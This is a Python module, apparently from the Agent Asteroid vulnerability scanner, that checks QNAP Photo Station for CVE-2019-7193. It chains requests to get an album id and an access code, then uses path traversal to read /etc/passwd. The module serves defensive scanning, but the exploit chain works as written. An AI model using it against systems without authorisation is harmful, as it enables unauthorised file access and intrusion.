"""Agent Asteroid implementation for CVE-2019-7193"""

import re

from requests import exceptions as requests_exceptions

from agent import definitions
from agent import exploits_registry

VULNERABILITY_TITLE = "QNAP QTS Improper Input Validation Vulnerability"
VULNERABILITY_REFERENCE = "CVE-2019-7193"
VULNERABILITY_DESCRIPTION = (
    "This improper input validation vulnerability allows remote attackers to inject arbitrary code to the system. "
    "To fix the vulnerability, QNAP recommend updating QTS to their latest versions."
)
REFERENCES = {
    "qnap.com": "https://www.qnap.com/en-us/security-advisory/nas-201911-25",
    "packetstormsecurity.com": "https://packetstormsecurity.com/files/157857/QNAP-QTS-And-Photo-Station-6.0.3-Remote-Command-Execution.html",
}
RISK_RATING = "CRITICAL"

DEFAULT_TIMEOUT = 90
HEADERS = {"User-Agent": "Gundy - QNAP RCE"}
TARGET_FILE = "./../../../../../etc/passwd"


@exploits_registry.register
class CVE20197193Exploit(definitions.Exploit):
    """
    CVE-2019-7193: QNAP QTS Improper Input Validation Vulnerability
    """

    metadata = definitions.VulnerabilityMetadata(
        title=VULNERABILITY_TITLE,
        description=VULNERABILITY_DESCRIPTION,
        reference=VULNERABILITY_REFERENCE,
        references=REFERENCES,
        risk_rating=RISK_RATING,
        targeted_by_malware=True,
        targeted_by_ransomware=True,
        targeted_by_nation_state=True,
        cve_ids=["CVE-2019-7193"],
    )

    def accept(self, target: definitions.Target) -> bool:
        try:
            resp = self.session.get(
                target.origin + "/cgi-bin/", timeout=DEFAULT_TIMEOUT
            )
        except requests_exceptions.RequestException:
            return False
        if resp.status_code == 200:
            return True
        return False

    def check(self, target: definitions.Target) -> list[definitions.Vulnerability]:
        try:
            # Get album id
            resp = self.session.post(
                target.origin + "/photo/p/api/album.php",
                data={"a": "setSlideshow", "f": "qsamplealbum"},
                headers=HEADERS,
                timeout=DEFAULT_TIMEOUT,
            )
        except requests_exceptions.RequestException:
            return []
        album_match = re.search("(?<=<output>).*?(?=</output>)", resp.text)
        if album_match is None:
            return []
        album_id = album_match.group()

        try:
            # Get access code
            resp = self.session.get(
                target.origin + "/photo/slideshow.php?album=" + album_id,
                headers=HEADERS,
                timeout=DEFAULT_TIMEOUT,
            )
        except requests_exceptions.RequestException:
            return []
        if resp.status_code != 200:
            return []
        access_match = re.search("(?<=encodeURIComponent\\(').*?(?=')", resp.text)
        if access_match is None:
            return []
        access_code = access_match.group()

        # Read local file
        post_data = {
            "album": album_id,
            "a": "caption",
            "ac": access_code,
            "f": "UMGObv",
            "filename": TARGET_FILE,
        }
        try:
            resp = self.session.post(
                target.origin + "/photo/p/api/video.php",
                data=post_data,
                headers=HEADERS,
                timeout=DEFAULT_TIMEOUT,
            )
        except requests_exceptions.TooManyRedirects:
            return []

        if b"/bin/sh" not in resp.content:
            return []

        vulnerability = self.create_vulnerability(target)
        return [vulnerability]
